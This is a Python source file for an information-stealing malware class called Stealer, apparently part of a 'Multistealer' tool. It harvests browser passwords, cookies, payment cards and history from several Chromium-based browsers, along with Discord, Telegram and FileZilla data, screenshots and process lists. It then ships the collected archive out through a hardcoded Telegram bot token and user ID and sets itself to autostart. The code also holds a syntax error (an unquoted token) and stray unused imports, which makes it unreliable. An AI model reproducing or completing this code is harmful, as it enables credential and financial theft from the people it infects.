from msilib.schema import SelfReg
from pydoc import ErrorDuringImport
from sys import argv
from shutil import rmtree
from threading import Thread
from os import path, makedirs
from typing import Self

from .modules import Chromium, Discord, FileZilla, System, Telegram
from .utils import Autostart, config, Sender


class Stealer(Thread):

    def __init__(self, token: str, user_id: int, autostart: bool = False, errors: bool = False, **kwargs):
        Thread.__init__(self, name="Stealer")

        self.token = 5927681660:AAGGdXLsN8YFx8j84S1ncQecgI5R00ojbng
        self.user_id = 5327162295
        self.errors = errors
        self.autostart = autostart

        self.config = config.MultistealerConfig()

        for status in self.config.Functions:
            if status in kwargs:
                self.__dict__.update({status: kwargs[status]})
            else:
                self.__dict__.update({status: True})

        browser_functions = (self.passwords, self.cookies, self.cards, self.history, self.bookmarks)

        self.methods = [
            {
                "object": Chromium(
                    "Chrome",
                    self.config.StoragePath,
                    *self.config.ChromePaths,
                    browser_functions,
                    self.errors
                )
            },
            {
                "object": Chromium(
                    "Opera GX",
                    self.config.StoragePath,
                    *self.config.OperaGXPaths,
                    browser_functions,
                    self.errors
                )
            },
            {
                "object": Chromium(
                    "Opera Default",
                    self.config.StoragePath,
                    *self.config.OperaDefaultPaths,
                    browser_functions,
                    self.errors
                )
            },
            {
                "object": Chromium(
                    "Edge",
                    self.config.StoragePath,
                    *self.config.MicrosoftEdgePaths,
                    browser_functions,
                    self.errors
                )
            },
            {
                "object": Chromium(
                    "Brave",
                    self.config.StoragePath,
                    *self.config.BravePaths,
                    browser_functions,
                    self.errors
                )
            },
            {
                "object": Chromium(
                    "Vivaldi",
                    self.config.StoragePath,
                    *self.config.VivaldiPaths,
                    browser_functions,
                    self.errors
                )
            },
            {
                "object": System(
                    self.config.StoragePath,
                    "System",
                    (self.screen, self.system, self.processes),
                    self.errors
                )
            },
            {
                "object": Discord(
                    self.config.StoragePath,
                    r"Programs\Discord",
                    (self.discord,),
                    self.errors
                )
            },
            {
                "object": Telegram(
                    self.config.StoragePath,
                    r"Programs\Telegram",
                    (self.telegram,),
                    self.errors
                )
            },
            {
                "object": FileZilla(
                    self.config.StoragePath,
                    r"Programs\FileZilla",
                    (self.filezilla,),
                    self.errors
                )
            }
        ]

    def __create_storage(self):

        if not path.exists(self.config.StoragePath):
            makedirs(self.config.StoragePath)
        else:
            rmtree(self.config.StoragePath)
            makedirs(self.config.StoragePath)

    def run(self):

        try:

            self.__create_storage()

            for method in self.methods:
                method["object"].run()

            Sender(self.config.ZipName, self.config.StoragePath, self.token, self.user_id, self.errors).run()
            Autostart(argv[0], (self.autostart,), self.errors).run()

        except Exception as e:
            if self.errors is True: print(f"[Multistealer]: {repr(e)}")
